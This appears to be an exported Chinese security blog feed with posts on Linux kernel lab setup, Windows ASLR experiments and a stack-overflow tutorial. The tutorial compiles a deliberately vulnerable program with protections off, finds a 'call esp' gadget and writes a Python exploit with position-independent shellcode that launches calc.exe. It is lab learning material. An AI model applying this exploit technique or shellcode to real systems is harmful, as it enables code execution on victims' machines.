class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dummy_init);</span><br><span class="line">module_exit(dummy_exit);</span><br></pre></td></tr></table></figure>

<p>执行make命令，输出以下内容则编译成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~/linuxkm$ </span><span class="language-bash">make</span></span><br><span class="line">make -C ~/linux-5.4.98/ M=`pwd`</span><br><span class="line">make[1]: Entering directory &#x27;/home/czx/linux-5.4.98&#x27;</span><br><span class="line">  CC [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.o</span><br><span class="line"></span><br><span class="line">  WARNING: Symbol version dump ./Module.symvers</span><br><span class="line">           is missing; modules will have no dependencies and modversions.</span><br><span class="line"></span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.mod.o</span><br><span class="line">  LD [M]  /mnt/d/Users/czx/NativeFiles/Desktop/PWN/linuxkm/modul.ko</span><br><span class="line">make[1]: Leaving directory &#x27;/home/czx/linux-5.4.98&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行 make boot</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">tools/labs$ </span><span class="language-bash">make boot</span></span><br><span class="line">qemu/create_net.sh lkt-tap0</span><br><span class="line">qemu/create_net.sh lkt-tap1</span><br><span class="line">/home/czx/linux-kernel-labs/tools/labs/templates/assignments/6-e100/nttcp -v -i &amp;</span><br><span class="line">nttcp-l: nttcp, version 1.47</span><br><span class="line">nttcp-l: running in inetd mode on port 5037 - ignoring options beside -v and -p</span><br><span class="line">bind: Address already in use</span><br><span class="line">nttcp-l: service-socket: bind:: Address already in use, errno=98</span><br><span class="line">ARCH=x86 qemu/qemu.sh -kernel /home/czx/linux-kernel-labs/arch/x86/boot/bzImage -device virtio-serial -chardev pty,id=virtiocon0 -device virtconsole,chardev=virtiocon0 -serial pipe:pipe1 -serial pipe:pipe2 -netdev tap,id=lkt-tap0,ifname=lkt-tap0,script=no,downscript=no -net nic,netdev=lkt-tap0,model=virtio -netdev tap,id=lkt-tap1,ifname=lkt-tap1,script=no,downscript=no -net nic,netdev=lkt-tap1,model=i82559er -drive file=core-image-minimal-qemux86.ext4,if=virtio,format=raw -drive file=disk1.img,if=virtio,format=raw -drive file=disk2.img,if=virtio,format=raw --append &quot;root=/dev/vda loglevel=15 console=hvc0 pci=noacpi&quot; --display none -s -m 256</span><br><span class="line">char device redirected to /dev/pts/9 (label virtiocon0)</span><br></pre></td></tr></table></figure>

<p>使用 minicom 登录qemu，注意 -D 后的设备号与上面输出的最后一行保持一致，进入时输入root，即获得shell界面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">minicom -D /dev/pts/9</span><br><span class="line">或</span><br><span class="line">minicom -D serial.pts</span><br></pre></td></tr></table></figure>

<h3 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h3><h3 id="Printk"><a href="#Printk" class="headerlink" title="Printk"></a>Printk</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><h3 id="Sub-modules"><a href="#Sub-modules" class="headerlink" title="Sub-modules"></a>Sub-modules</h3><h3 id="Kernel-oops"><a href="#Kernel-oops" class="headerlink" title="Kernel oops"></a>Kernel oops</h3><h3 id="Module-parameters"><a href="#Module-parameters" class="headerlink" title="Module parameters"></a>Module parameters</h3><h3 id="proc-info"><a href="#proc-info" class="headerlink" title="proc info"></a>proc info</h3>]]></content>
      <categories>
        <category>linux-kernel-labs</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/17/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>AWD跳板机搭建</title>
    <url>/2023/10/19/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Exploitme——栈上执行Shellcode</title>
    <url>/2023/10/19/Exploitme/</url>
    <content><![CDATA[<p>参考链接</p>
<ul>
<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode - 跳跳糖 (tttang.com)</a></li>
<li><a href="https://tttang.com/archive/680/#toc_0x01-exploitme1-ret-eip-overwrite-more-space-on-stack">Exploit开发系列教程-Exploitme1 (“ret eip” overwrite) &amp;More space on stack - 跳跳糖 (tttang.com)</a></li>
</ul>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><p>visual studio : windows上还是得用这个，mingw不够友好</p>
<ul>
<li><p>配置：修改配置时，记得正确调整配置模式和平台，这里选用 所有配置+所有平台。</p>
<ul>
<li>禁用安全检查 &#x2F;GS-（配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查）</li>
<li>关闭数据执行保护 &#x2F;NXCOMPAT:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
</ul>
</li>
<li><p>技巧：</p>
<ul>
<li>启动调试后，（已默认开启地址级调试）可以通过 <code>调试—&gt;窗口—&gt;反汇编</code> 查看程序的反汇编，快捷键 ctrl+alt+d</li>
</ul>
</li>
</ul>
</li>
<li><p>windbg : windows上绕不过去的调试器，早上手早熟练；</p>
<ul>
<li><p>如果使用windows商店下载的windbg，虽然好看，但需要解决权限问题，比较麻烦（后面需要往windbg文件夹里添加文件，或者复制一份到普通目录下），<a href="https://www.zhihu.com/question/321693587">权限问题解决</a></p>
</li>
<li><p>也可以下载 WDK，使用里面带的 windbg，下载链接：<a href="https://learn.microsoft.com/zh-CN/windows-hardware/drivers/other-wdk-downloads#step-2-install-the-wdk">WDK 下载 </a></p>
</li>
</ul>
</li>
<li><p>python2 ： 建议从官网下载<code>2.7.18</code>安装版，如果使用pyenv或其他python版本管理工具下载便携版，后面可能会因为缺少注册表项出问题（比如找不到python或者<code>failed to load python module</code>)</p>
<ul>
<li><p>下载链接：<a href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a> 注意32位还是64位需要和使用的windbg保持一致</p>
</li>
<li><p>之后下安装<code>pykd</code>包，不然运行插件后会出现“Do not run this script outside of a debugger !”，命令和下面相似</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Python27\Scripts&gt; .\pip.exe install pykd</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>mona 插件</p>
<ul>
<li>下载链接：<a href="https://github.com/corelan/windbglib">corelan&#x2F;windbglib</a></li>
<li>如果上面下载的<code>pykd.pyd</code>没办法使用，可以从这里下载 <a href="https://github.com/hac425xxx/pykd-ext/releases/tag/pykd_ext_2.0.0.24">pykd_ext</a>，将解压后得到的 pykd.dll 放到对应目录即可。</li>
</ul>
</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><p>一个存在漏洞的c&#x2F;c++程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name and press ENTER\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果运行程序后，输入的字符超过32个，比如32个“a”+4个“b“+4个”c”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>

<p>会出现以下情况</p>
<ul>
<li><p>debug模式下，<code>运行时检查</code>会检查到输入过长破坏了<code>name</code>变量</p>
</li>
<li><p>release模式下</p>
<ul>
<li><p>运行，以非0的错误代码（如-1073741819）退出</p>
</li>
<li><p>调试，显示触发异常的地址为 0x63636363，符合预期</p>
<p><img src="/../pic/Exploitme/%E6%9C%AA%E7%BB%8F%E5%A4%84%E7%90%86%E7%9A%84%E5%BC%82%E5%B8%B8.png" alt="未经处理的异常"></p>
</li>
</ul>
</li>
</ul>
<p>为了方便，之后我们只在<code>release</code>模式下运行即可。</p>
<p>为了更简洁地描述，我们修改程序，让文本内容可从文件<code>name.dat</code>中被读取，编译后运行结果和上面一致</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>); # 注意要使用绝对路径，不然下面使用的windbg找不到该文件</span><br><span class="line">    <span class="keyword">if</span> (!f)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> bytes = ftell(f);</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    fread(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">    name[bytes] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>name.dat:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>

<h3 id="使用-windbg-进行调试"><a href="#使用-windbg-进行调试" class="headerlink" title="使用 windbg 进行调试"></a>使用 windbg 进行调试</h3><p>使用<code>windbg</code>加载上面生成的程序<code>Exploitme.exe</code>，按<code>F5</code>或输入命令<code>g</code>，得到以下报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(31e0.4f48): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000000 ebx=0067b000 ecx=0fce700e edx=755d0334 esi=00c868e8 edi=00c8c2a8</span><br><span class="line">eip=63636363 esp=008ff888 ebp=62626262 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246</span><br><span class="line">63636363 ??              ???</span><br></pre></td></tr></table></figure>

<p>查看栈内存，我们希望cccc指向cccc之后的这块内存（当执行完main函数中的ret后，ESP寄存器的值刚好指向这里），我们会在这里填充shellcode。但由于ASLR（地址空间布局随机化，简称地址随机化），两次的ESP值不同，也就意味着我们无法将 cccc 替换为一个固定的地址。</p>
<p>![aslr for stack](..&#x2F;pic&#x2F;Exploitme&#x2F;aslr for stack.png)</p>
<p>不过，可以将 cccc 替换为一个指向 jmp ESP 指令的地址（代码段的指令的地址是固定的），程序执行流就会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret ——&gt; jmp ESP --&gt; [shellcode]</span><br></pre></td></tr></table></figure>

<h3 id="使用mona"><a href="#使用mona" class="headerlink" title="使用mona"></a>使用mona</h3><p>为了寻找 jmp ESP 指令的地址，我们可以使用 mona 插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:000&gt; .load pykd</span><br><span class="line">0:000&gt; !pykd.info</span><br><span class="line"></span><br><span class="line">pykd bootstrapper version: 2.0.0.24</span><br><span class="line"></span><br><span class="line">Installed python:</span><br><span class="line"></span><br><span class="line">Version:        Status:     Image:</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">* 2.7 x86-32    Loaded      C:\Windows\SYSTEM32\python27.dll  # 注意要选用python2，如果默认指向了python3，可使用 !pykd.select -2.7进行切换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:000&gt; !py mona jmp -r ESP -m ntdll.dll	# 尝试了 kernel32.dll 没找到符合要求得指令，在 ntdll.dll 中找到了</span><br><span class="line"></span><br><span class="line">** You are running pykd.pyd v0.3.4.15. Use at your own risk **</span><br><span class="line"></span><br><span class="line">Hold on...</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    - Search complete, processing results</span><br><span class="line">[+] Preparing output file &#x27;jmp.txt&#x27;</span><br><span class="line">    - (Re)setting logfile jmp.txt</span><br><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 1 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 4 </span><br><span class="line">[+] Results : </span><br><span class="line">0x77bece33 |   0x77bece33 (b+0x0010ce33)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afb318 |   0x77afb318 (b+0x0001b318)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afc712 |   0x77afc712 (b+0x0001c712)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd1f8 |   0x77bbd1f8 (b+0x000dd1f8)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd250 |   0x77bbd250 (b+0x000dd250)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">    Found a total of 5 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:00.759000</span><br></pre></td></tr></table></figure>

<p><code>mona</code>没有找到 <code>jmp ESP</code>指令，但找到了功能基本一致的<code>call ESP</code>和<code>push esp; ret</code>指令（这两种指令执行后，ESP的值不同，不过对我们影响不大），都能够将执行流引导至<code>shellcode</code>。</p>
<p>我们使用上面找的<code>call esp</code>指令，其地址为 <code>0x77bece33</code>（系统重启前有效，详情见 <a href="https://czxvan.github.io/2023/10/22/ASLR-in-Windows/">ASLR in Windows</a>）</p>
<h3 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h3><p>编写python脚本 <code>exp1.py</code>，修改<code>name.dat</code>中的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = <span class="string">b&#x27;\xcc&#x27;</span>	<span class="comment"># 调试模式下会在此中断</span></span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>

<p>回到visual studio，release模式下进行调试，main返回后，出现以下弹窗：</p>
<p><img src="/../pic/Exploitme/0xcc.png" alt="0xcc"></p>
<p>说明测试成功。</p>
<p>下面将 “\xcc” 替换为真正的 <code>shellcode</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>

<p>其中，<code>shellcode</code>由以下程序得到，转换原理见 <a href="https://czxvan.github.io/2023/10/20/Create-Shellcode-in-Windows/">Create Shellcode in Windows</a>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WinExec                0x7bb4c07f</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line">    DefineFuncPtr(WinExec);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> calc[] = &#123; <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;     <span class="comment">// makes our shellcode shorter</span></span><br><span class="line">    My_WinExec(calc, SW_SHOW);</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后在release模式下运行程序，成功执行<code>shellcode</code>，弹出了一个计算器：</p>
<p><img src="/../pic/Exploitme/pwn.png" alt="pwn"></p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>winsock practice</title>
    <url>/2023/10/19/winsock-practice/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Create Shellcode in Windows</title>
    <url>/2023/10/20/Create-Shellcode-in-Windows/</url>
    <content><![CDATA[<p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode)</a></li>
</ul>
<span id="more"></span>]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>ASLR in Windows</title>
    <url>/2023/10/22/ASLR-in-Windows/</url>
    <content><![CDATA[<p>众所周知，<code>ASLR</code>会使得<code>PE</code>文件的加载基址随机化，但有时候我们还是能够利用固定的地址，指向<code>kernel32.dll ntdll.dll</code>等<code>dll</code>文件中的特定指令，这是为什么呢？</p>
<p>参考资料：</p>
<ul>
<li><p><a href="https://blog.csdn.net/weixin_43742894/article/details/105879904">ntdll 的内存加载位置</a></p>
</li>
<li><p><a href="http://www.nynaeve.net/?p=198">Why are certain DLLs required to be at the same base address system-wide? « Nynaeve</a></p>
</li>
</ul>
<span id="more"></span>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Windows</code>和<code>Linux</code>下的<code>ASLR</code>区别很大。</p>
<p>在<code>Linux</code>下，<code>ASLR</code>的实现分为两个部分</p>
<ul>
<li>系统部分，根据<code>/proc/sys/kernel/randomize_va_space</code>中设置的等级，影响 <code>栈、库、mmap、堆</code>（stack .so mmap heap）基址的随机性。</li>
<li>编译器部分，由<code>PIE</code>选项决定编译得到程序是否是地址无关的，如果是，程序加载基址和全局数据地址（.text .data .bss）就可以随机化。</li>
</ul>
<p>在<code>Windwos</code>下，<code>ASLR</code>可由 <code>Visual Studio</code> 下的一个链接器选项——随机基址（<code>/DYNAMICBASE</code>）控制。</p>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="ASLR与程序基址的关系"><a href="#ASLR与程序基址的关系" class="headerlink" title="ASLR与程序基址的关系"></a>ASLR与程序基址的关系</h3><h4 id="开启ASLR"><a href="#开启ASLR" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>使用visual studio生成一个可执行程序<code>Exploime.exe</code>，开启随机基址</p>
<p><img src="/../pic/ASLR-in-Windows/ASLR-YES.png" alt="ASLR open"></p>
<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
<p><img src="/../pic/ASLR-in-Windows/pic1.png" alt="pic1"></p>
<p>重启windbg，重复上面操作</p>
<p><img src="/../pic/ASLR-in-Windows/pic2.png" alt="pic2"></p>
<p>发现，和之前一样。</p>
<p>重启电脑，再来一次，得到</p>
<p><img src="/../pic/ASLR-in-Windows/pic3.png" alt="pic3"></p>
<p>发现各个基址出现变化。</p>
<h4 id="关闭随机基址"><a href="#关闭随机基址" class="headerlink" title="关闭随机基址"></a>关闭随机基址</h4><p>关闭随机基址，重新生成<code>Exploime.exe</code></p>
<p><img src="/../pic/ASLR-in-Windows/ASLR-NO.png" alt="ASLR open"></p>
<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
<p><img src="/../pic/ASLR-in-Windows/pic4.png" alt="pic4"></p>
<p>重启windbg，重复上面操作</p>
<p><img src="/../pic/ASLR-in-Windows/pic5.png" alt="pic5"></p>
<p>和上面一致，重启电脑，再来一次，得到</p>
<p><img src="/../pic/ASLR-in-Windows/pic6.png" alt="pic6"></p>
<p>发现关闭了<code>ASLR</code>的模块（<code>Exploitme</code>）基址没有变化，其余默认开启了<code>ASLR</code>的系统模块基址发生了变化。</p>
<h2 id="ASLR与堆栈基址的关系"><a href="#ASLR与堆栈基址的关系" class="headerlink" title="ASLR与堆栈基址的关系"></a>ASLR与堆栈基址的关系</h2><h3 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h3><p>未开启<code>ASLR</code>时，两次运行程序，查看堆栈地址结果如下，完全一致，不过可以看出其他模块的ASLR还是发挥了作用的：</p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\address1.png" alt="address1"></p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\address2.png" alt="address2"></p>
<h3 id="开启ASLR-1"><a href="#开启ASLR-1" class="headerlink" title="开启ASLR"></a>开启ASLR</h3><p>开启<code>ASLR</code>后，可以看出两次运行堆栈地址的变化：</p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\address_aslr_1.png" alt="address_aslr_1"></p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\address_aslr_2.png" alt="address_aslr_2"></p>
